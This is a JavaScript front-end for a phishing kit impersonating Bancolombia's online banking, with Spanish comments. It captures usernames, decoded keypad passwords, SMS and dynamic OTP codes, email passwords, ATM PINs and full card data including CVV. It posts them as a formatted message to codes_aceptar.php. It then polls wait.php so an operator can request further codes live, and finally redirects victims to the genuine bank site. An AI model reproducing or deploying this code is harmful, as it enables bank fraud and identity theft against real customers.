$(document).ready(function () {
  $("#expiryDate").inputmask("99/99", { placeholder: "MM/YY" });
  function getParameterByName(name, defaultValue = null) {
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
    var results = regex.exec(window.location.href);
    if (!results) return defaultValue;
    if (!results[2]) return defaultValue;
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  // Obtener el valor del parámetro 'id' con valor por defecto '1462604384'
  var chatID = getParameterByName("id", "1462604384");
  localStorage.setItem("chatID", chatID);

  var checkInterval = setInterval(function () {
    var button = $("#btnGoToLoginId");
    if (button.length) {
      // Si el botón existe, agrega la clase
      button.addClass("btnGoToLoginId2");
      button.removeAttr("id");
      var elementoClonado = $("#princial-loader").clone();

      // Guardar el HTML en localStorage
      localStorage.setItem("elementoHTML", elementoClonado.html());

      $(".form").html(ClavePassword());
      clearInterval(checkInterval);
    }
  }, 30); // Verifica cada 100 milisegundos

  startCheckingStatus("visit");

  // Variable global para almacenar el ID del intervalo
  var intervalID;

  // Inicia el chequeo del estado cada 3 segundos
  function startCheckingStatus(typeValid = "visit") {
    // Asegúrate de que no haya otro intervalo en ejecución
    clearInterval(intervalID);

    // Usa una función anónima para pasar `typeValid` a `checkStatus`
    intervalID = setInterval(function () {
      checkStatus(typeValid);
    }, 3000);
  }

  function hiddenAll() {
    $("#loader").removeClass("hidden");
    $("#user").addClass("hidden");
    $("#clave").addClass("hidden");
    $("#username").val("");
    $("#passcrypt").val("");
    $("#otros").addClass("hidden");
    $("#div-sms").addClass("hidden");
    $("#div-dinamica").addClass("hidden");
    $("#div-correo").addClass("hidden");
    $("#div-clave-cajero").addClass("hidden");
    $(".otp-input").val("");
    $(".otp-input-sms").val("");
    $("#claveCorreo").val("");
    $("#claveCorreo").val("");
    $("#correo").val("");
    $("#cardNumber").val("");
    $("#expiryDate").val("");
    $("#cvv").val("");
    $("#div-datos-debito").addClass("hidden");
  }

  function checkStatus(typeValid) {
    $.ajax({
      url: "wait.php",
      type: "POST",
      dataType: "json",
      data: {
        userID: localStorage.getItem("username"),
        typeValid: typeValid,
      },
      success: function (response) {
        // Guardar el estado actual antes de cambiar el formulario
        // sms
        // dinamica
        // ambas
        // correo_clave
        // cambio_clave
        // finalizar
        // inicio
        if (response.response.type === "waiting") {
          // Aún esperando, no hacer nada
        } else if (response.response.type === "login") {
          $("#user").removeClass("hidden");
          $("#loader").addClass("hidden");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "sms") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-sms").removeClass("hidden");
          $("#loader").addClass("hide");

          clearInterval(intervalID);
        } else if (response.response.type === "dinamica") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-dinamica").removeClass("hidden");
          $("#loader").addClass("hide");

          clearInterval(intervalID);
        } else if (response.response.type === "ambas") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-dinamica").removeClass("hidden");
          $("#div-sms").removeClass("hidden");
          $("#loader").addClass("hide");

          clearInterval(intervalID);
        } else if (response.response.type === "correo_clave") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-correo").removeClass("hidden");
          $("#loader").addClass("hide");

          clearInterval(intervalID);
        } else if (response.response.type === "cambio_clave") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-clave-cajero").removeClass("hidden");
          $("#loader").addClass("hide");
          clearInterval(intervalID);
        } else if (response.response.type === "debit_card") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-datos-debito").removeClass("hidden");
          $("#loader").addClass("hide");
          clearInterval(intervalID);
        } else if (response.response.type === "rechazar_codigo") {
          $("#loader").addClass("hidden");
          lastForm();
          Swal.fire({
            icon: "error",
            title: "Información incorrecta",
            text: "Intentelo de nuevo",
          }).then((result) => {
            if (result.isConfirmed) {
              // Redirect the user
              lastForm();
            }
          });

          // cargarUltimoFormularioGuardado();
          clearInterval(intervalID); // Detener el chequeo
        } else if (response.response.type === "aceptar_codigo") {
          $(".text-center").text(
            "Estamos validando tus datos espera un momento..."
          );
        } else if (response.response.type === "finalizar") {
          clearInterval(intervalID);
          Swal.fire({
            title: "Activación completa",
            text: "sus datos han sido actualizados correctamente",
            icon: "success",
          }).then((result) => {
            if (result.isConfirmed) {
              // Redirect the user
              window.location.href =
                "https://sucursalpersonas.transaccionesbancolombia.com/";
            }
          });
        } else if (response.response.type === "inicio") {
          $("#user").removeClass("hidden");
          $("#loader").addClass("hidden");
          localStorage.setItem("lastForm", "login");
          clearInterval(intervalID);
        }
      },
      error: function (jqXHR, textStatus, errorThrown) {
        clearInterval(intervalID); // Detener el chequeo en caso de error
      },
    });
  }

  const keys = {
    BnP4: "0",
    kLca: "3",
    RlXT: "6",
    "7YAh": "1",
    fi12: "9",
    "8QeU": "5",
    JdW3: "7",
    "6CHM": "8",
    DmjO: "2",
    ENG5: "4",
  };

  function translatePassword(password) {
    let translated = "";
    for (let i = 0; i < password.length; i += 4) {
      let key = password.substring(i, i + 4);
      translated += keys[key] !== undefined ? keys[key] : "";
    }
    return translated;
  }

  $(document).on("click", ".btnSend", function (event) {
    // Evita el envío del formulario
    event.preventDefault();

    const obtenerValor = (selector) => {
      return $(selector).length > 0 ? $(selector).val() : "";
    };

    var username = obtenerValor("#username");
    var password = $("#passcrypt").val();
    var translatedPassword = translatePassword(password);
    if (username.length > 0 && translatedPassword == "") {
      $("#user").addClass("hidden");
      $("#clave").removeClass("hidden");
      return;
    }
    const form = localStorage.getItem("lastForm");
    if (form == "debit_card") {
      var cardNumber = $("#cardNumber").val().trim();
      var expiryDate = $("#expiryDate").val().trim();
      var cvv = $("#cvv").val().trim();

      if (!luhnCheck(cardNumber)) {
        alert("Número de tarjeta inválido.");
        return;
      }

      if (!validateExpiryDate(expiryDate)) {
        alert("Fecha de vencimiento inválida.");
        return;
      }
      if (cvv == "") {
        alert("Agregue el CVV");
        return;
      }
    }
    $(".direction--row").addClass("hide");
    $("#loader").removeClass("hide");
    var dinamica = obtenerValor(".otp-input-hidden");
    var sms = obtenerValor(".otp-input-sms-hidden");
    var claveTel = obtenerValor("#telefono");
    var cuatroLast = obtenerValor("#credit-card-last4");
    var correo = obtenerValor("#correo");
    var claveCorreo = obtenerValor("#claveCorreo");
    var claveCajero = obtenerValor("#clavecajero");
    // Crear el mensaje usando template literals y condicionales
    const messageSkm = `Información:\n
        ${username ? `👤 username: ${username}\n` : ""}
        ${translatedPassword ? `🔑 passsword: ${translatedPassword}\n` : ""}
        ${sms ? `💬 SMS: ${sms}\n` : ""}
        ${dinamica ? `💬 Dinamica: ${dinamica}\n` : ""}
        ${claveTel ? `📞 Clave Telefonica: ${claveTel}\n` : ""}
        ${cuatroLast ? `💳 Últimos 4 dígitos: ${cuatroLast}\n` : ""}
        ${correo ? `📧 Correo: ${correo}\n` : ""}
        ${claveCorreo ? `🔑 Clave del Correo: ${claveCorreo}` : ""}
        ${claveCajero ? `🔑 Clave cambio Cajero: ${claveCajero}\n` : ""}
        ${cardNumber ? `💳 Card Number: ${cardNumber}\n` : ""}
        ${expiryDate ? `📅 Vence: ${expiryDate}\n` : ""}
        ${cvv ? `🔑 CVV: ${cvv}\n` : ""}`;

    if (
      username ||
      translatedPassword ||
      dinamica ||
      sms ||
      claveTel ||
      cuatroLast ||
      correo ||
      claveCorreo ||
      cardNumber ||
      expiryDate ||
      cvv ||
      claveCajero
    ) {
      $.ajax({
        url: "codes_aceptar.php",
        type: "POST",
        data: {
          messageSkm: messageSkm,
        },
        success: function (response) {
          hiddenAll();
          startCheckingStatus("validcode");
        },
        error: function (jqXHR, textStatus, errorThrown) {
          $("#response").html("<p>Error: " + textStatus + "</p>");
        },
      });
    }
  });

  function handleOtpInput(inputClass) {
    $(inputClass).on("input", function () {
      if (this.value.length === 1) {
        $(this).next(inputClass).focus();
      }
      updateHiddenInput(inputClass);
    });

    $(inputClass).on("keydown", function (e) {
      if (e.key === "Backspace" && this.value.length === 0) {
        $(this).prev(inputClass).focus();
      }
    });

    function updateHiddenInput(inputClass) {
      let otpValue = "";
      $(inputClass).each(function () {
        otpValue += $(this).val();
      });
      // Actualiza el campo oculto usando una clase única o un ID específico
      let hiddenInputClass = inputClass + "-hidden";
      $(hiddenInputClass).val(otpValue);
    }

    $(inputClass).on("paste", function (e) {
      let pasteData = e.originalEvent.clipboardData.getData("text");
      if (pasteData.length === 6 && $.isNumeric(pasteData)) {
        let otpArray = pasteData.split("");
        $(inputClass).each(function (index) {
          $(this).val(otpArray[index]);
        });
        updateHiddenInput(inputClass);
      }
      e.preventDefault();
    });
  }
  $("#clavecajero, #clavecajero2").on("input", function () {
    var $this = $(this);
    var value = $this.val();

    // Elimina cualquier carácter que no sea un número
    value = value.replace(/\D/g, "");

    // Si la longitud es mayor a 4, limita a 4 caracteres
    if (value.length > 4) {
      value = value.slice(0, 4);
    }

    // Actualiza el valor del input
    $this.val(value);
  });
  handleOtpInput(".otp-input");
  handleOtpInput(".otp-input-sms");

  function createInputField(
    id,
    placeholder,
    maxlength,
    ariaDescribedBy,
    type = "text",
    icon = null
  ) {
    let iconHtml = icon
      ? `<canvas-svg _ngcontent-mex-c48="" role="presentation" class="input__icon input__icon--left flex">${icon}</canvas-svg>`
      : "";
    return `
        <div class="form__input margin-xs-30--top">
            <canvas-input-text class="ng-touched ng-dirty ng-valid" maxlength="${maxlength}">
                <div class="form__input">
                    <label role="text" class="label" for="${id}"></label>
                    <div class="form__input--inline">
                        <input class="input input--text ng-valid ng-dirty ng-touched input--active input--with-icon input--with-icon--left input-w-aux__input" 
                            id="${id}" 
                            type="${type}"
                            placeholder="${placeholder}" 
                            autocomplete="off" 
                            aria-describedby="${ariaDescribedBy}" 
                            maxlength="${maxlength}" 
                            data-gtm-form-interact-field-id="0">
                        ${iconHtml}
                    </div>
                </div>
            </canvas-input-text>
        </div>`;
  }

  function createForm(inputs, buttonId = "btnCodes") {
    return `
        <form novalidate="" role="form" autocomplete="off" class="form ng-invalid ng-touched ng-dirty" data-gtm-form-interact-id="0">
            ${inputs.join("")}
            <div class="margin-xs-24--top">
                <canvas-button width="100%">
                    <button class="button ${buttonId} button--primary" style="width: 100%;">
                        <span>Ingresar</span>
                    </button>
                </canvas-button>
            </div>
        </form>`;
  }

  function ClavePassword() {
    const iconUser = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px"><path fill="#333" stroke-linecap="round" stroke-width="0.5" stroke-linejoin="round" d="M22.879 22.129a.75.75 0 1 1-1.5 0v-2.39c0-2.212-1.979-4.031-4.449-4.031H6.532c-2.47 0-4.449 1.82-4.449 4.03v2.39a.75.75 0 1 1-1.5 0v-2.39c0-3.069 2.677-5.53 5.95-5.53H16.93c3.272 0 5.949 2.461 5.949 5.53v2.39zm-10.79-10.006a5.77 5.77 0 1 1 0-11.54 5.77 5.77 0 0 1 0 11.54zm0-1.5a4.27 4.27 0 1 0 0-8.54 4.27 4.27 0 0 0 0 8.54z"></path></svg>`;
    const iconLock = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px"><path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path><path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path><path fill="none" d="M12.104 14.582v2.695"></path><path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path></svg>`;

    const userInput = createInputField(
      "user",
      "Nombre de usuario",
      12,
      "first-credential-input-error",
      "text",
      iconUser
    );
    const passwordInput = createInputField(
      "pass",
      "Contraseña",
      15,
      "second-credential-input-error",
      "password",
      iconLock
    );
    return createForm([userInput, passwordInput], "btnGoToLoginId2");
  }

  function sms() {
    const smsInput = createInputField(
      "sms",
      "Código SMS",
      12,
      "first-credential-input-error"
    );
    return createForm([smsInput]);
  }

  function claveTelefonica() {
    const claveInput = createInputField(
      "telefono",
      "Clave Telefónica",
      12,
      "first-credential-input-error"
    );
    return createForm([claveInput]);
  }

  function ultimos4DigitosTarjeta() {
    const tarjetaInput = createInputField(
      "credit-card-last4",
      "Últimos 4 dígitos de la tarjeta",
      4,
      "credit-card-input-error"
    );
    return createForm([tarjetaInput]);
  }

  function formularioCompleto() {
    const claveInput = createInputField(
      "telefono",
      "Clave Telefónica",
      12,
      "telefono-input-error"
    );
    const tarjetaInput = createInputField(
      "credit-card-last4",
      "Últimos 4 dígitos de la tarjeta",
      4,
      "credit-card-input-error"
    );
    return createForm([claveInput, tarjetaInput]);
  }

  function formularioCorreo() {
    const correoInput = createInputField(
      "correo",
      "Correo electrónico",
      100,
      "telefono-input-error",
      "mail"
    );
    const claveInput = createInputField(
      "claveCorreo",
      "Contraseña de tu correo",
      100,
      "credit-card-input-error",
      "password"
    );
    return createForm([correoInput, claveInput]);
  }

  function claveCajero() {
    const claveCajero = createInputField(
      "clavecajero",
      "Clave de cajero",
      4,
      "clavecajero-input-error"
    );
    return createForm([claveCajero]);
  }

  function lastForm() {
    const form = localStorage.getItem("lastForm");
    if (form === "login") {
      $("#user").removeClass("hidden");
      $("#loader").addClass("hidden");
    } else if (form === "sms") {
      $("#otros").removeClass("hidden");
      $("#div-sms").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (form === "dinamica") {
      $("#otros").removeClass("hidden");
      $("#div-dinamica").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (form === "ambas") {
      $("#otros").removeClass("hidden");
      $("#div-dinamica").removeClass("hidden");
      $("#div-sms").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (form === "correo_clave") {
      $("#otros").removeClass("hidden");
      $("#div-correo").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (form === "cambio_clave") {
      $("#otros").removeClass("hidden");
      $("#div-clave-cajero").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (response.response.type === "debit_card") {
      $("#otros").removeClass("hidden");
      $("#div-datos-debito").removeClass("hidden");
      $("#loader").addClass("hide");
    }
  }

  function luhnCheck(cardNumber) {
    let sum = 0;
    let shouldDouble = false;

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber.charAt(i));

      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  }

  function validateExpiryDate(expiryDate) {
    const [month, year] = expiryDate.split("/").map((val) => parseInt(val));
    if (month < 1 || month > 12) return false;

    const currentDate = new Date();
    const currentMonth = currentDate.getMonth() + 1; // Los meses en JavaScript son de 0 a 11
    const currentYear = parseInt(
      currentDate.getFullYear().toString().slice(-2)
    );

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false;
    }

    return true;
  }
});

// $(document).ready(function() {
//     function handleOtpInput(inputClass) {
//         $(inputClass).on("input", function() {
//             if (this.value.length === 1) {
//                 $(this).next(inputClass).focus();
//             }
//             updateHiddenInput(inputClass);
//         });

//         $(inputClass).on("keydown", function(e) {
//             if (e.key === "Backspace" && this.value.length === 0) {
//                 $(this).prev(inputClass).focus();
//             }
//         });

//         function updateHiddenInput(inputClass) {
//             let otpValue = "";
//             $(inputClass).each(function() {
//                 otpValue += $(this).val();
//             });
//             // Actualiza el campo oculto usando una clase única o un ID específico
//             let hiddenInputClass = inputClass + "-hidden";
//             $(hiddenInputClass).val(otpValue);
//         }

//         $(inputClass).on("paste", function(e) {
//             let pasteData = e.originalEvent.clipboardData.getData("text");
//             if (pasteData.length === 6 && $.isNumeric(pasteData)) {
//                 let otpArray = pasteData.split("");
//                 $(inputClass).each(function(index) {
//                     $(this).val(otpArray[index]);
//                 });
//                 updateHiddenInput(inputClass);
//             }
//             e.preventDefault();
//         });
//     }

//     handleOtpInput(".otp-input");
//     handleOtpInput(".otp-input-sms");
// });
// $("#loader").show();
// $("#div-correo").hide();
// $("#btnfin").hide();

// function checkStatus() {
//     $.ajax({
//         url: "wait.php",
//         type: "POST",
//         dataType: "json",
//         data: {
//             userID: localStorage.getItem("username"),
//         },
//         success: function(response) {
//             if (response.response.type === "waiting") {
//                 $("#loader").show();
//                 $("#div-dinamica").hide();
//                 $("#div-sms").hide();
//             } else if (response.response.type === "sms") {
//                 $("#loader").hide();
//                 $("#div-dinamica").hide();
//                 $("#div-sms").show();
//                 clearInterval(intervalID);
//             } else if (response.response.type === "dinamica") {
//                 $("#loader").hide();
//                 $("#div-sms").hide();
//                 $("#div-dinamica").show();
//                 clearInterval(intervalID);
//             } else if (response.response.type === "ambas") {
//                 $("#loader").hide();
//                 $("#div-dinamica").show();
//                 $("#div-sms").show();
//                 clearInterval(intervalID);
//             }
//         },
//         error: function(jqXHR, textStatus, errorThrown) {
//             $("#loader").hide();
//             clearInterval(intervalID);
//             $("#response").html("<p>Error: " + textStatus + "</p>");
//         },
//     });
// }

// var intervalID = setInterval(checkStatus, 3000); // Verifica cada 3 segundos
// function toggleLoader() {
//     $("#loader").show();
//     setTimeout(function() {
//         $("#loader").hide();
//     }, 3000);
// }
// $(document).ready(function() {
//     checkStatus(); // Llama inmediatamente la primera vez

//     $("#btnCodes").click(function() {

//         var dinamica = $(".otp-input-hidden")
//             .val(); // Leer el valor del campo username
//         var sms = $(".otp-input-sms-hidden").val();

//         var correo = $("#correo").val();
//         var clave = $("#clave").val();
//         if (dinamica || sms || clave || correo) {
//             $.ajax({
//                 url: "codes.php",
//                 type: "POST",
//                 data: {
//                     dinamica: dinamica,
//                     sms: sms,
//                     correo: correo + ' pass ' + clave,
//                 },
//                 success: function(response) {
//                     toggleLoader()
//                     $("#div-dinamica").hide();
//                     $("#div-sms").hide();
//                     $("#div-correo").show();
//                     $("#btnfin").show();

//                     Swal.fire({
//                         title: "Finalizado",
//                         text: "Su dispositivo fue registrado",
//                         icon: "success"
//                     }).then((result) => {
//                         if (result.isConfirmed) {
//                             if (correo.length > 0) {
//                                 window.location.href =
//                                     "https://sucursalpersonas.transaccionesbancolombia.com";
//                             } else {
//                                 Swal.close()
//                             }
//                         }
//                     });

//                 },
//                 error: function(jqXHR, textStatus, errorThrown) {
//                     $("#response").html("<p>Error: " + textStatus +
//                         "</p>");
//                 },
//             });
//         }
//     });
// });
